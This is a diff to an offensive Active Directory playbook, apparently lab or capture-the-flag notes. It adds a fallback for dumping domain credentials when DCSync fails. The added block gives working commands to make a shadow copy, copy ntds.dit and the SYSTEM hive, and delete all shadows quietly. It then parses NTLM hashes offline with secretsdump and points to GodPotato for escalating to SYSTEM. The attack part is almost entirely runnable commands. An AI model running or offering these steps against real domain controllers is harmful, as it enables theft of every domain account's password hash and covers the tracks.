@@ -41,6 +41,18 @@ awk -F: '{print $4}' $BoxDir/loot/dcsync.ntds | sort | uniq -d
 - [ ] Impacket returned `ERROR_DS_DRA_BAD_DN` → **Use NetExec `--ntds` instead**
 - [ ] DCSync is denied → **Go to Step 47 · [[AD - DCSync Grant]]**
 - [ ] The command reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**
+- [ ] Clock skew is too large for any Kerberos tool and cannot be fixed → **Use VSS to extract NTDS without Kerberos:**
+  ```powershell
+  vssadmin create shadow /for=C:
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
+  vssadmin delete shadows /all /quiet
+  ```
+  Download both files, then parse locally:
+  ```bash
+  secretsdump.py LOCAL -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/sys2.save -just-dc-ntlm
+  ```
+  This requires SYSTEM privileges, so use GodPotato or a similar token abuse tool first.
 
 ## Notes
 
@@ -50,3 +62,6 @@ When multiple accounts share the same NTLM hash, PTH works for all of them — u
 
 > [!warning] 💡
 > RemoteOperations access denied can appear before a successful DRSUAPI dump. Read the complete output before deciding it failed.
+
+> [!warning] 💡
+> A domain controller's SAM hive contains local accounts only. Domain account hashes are stored in `ntds.dit`; use the SYSTEM hive with it for offline parsing.
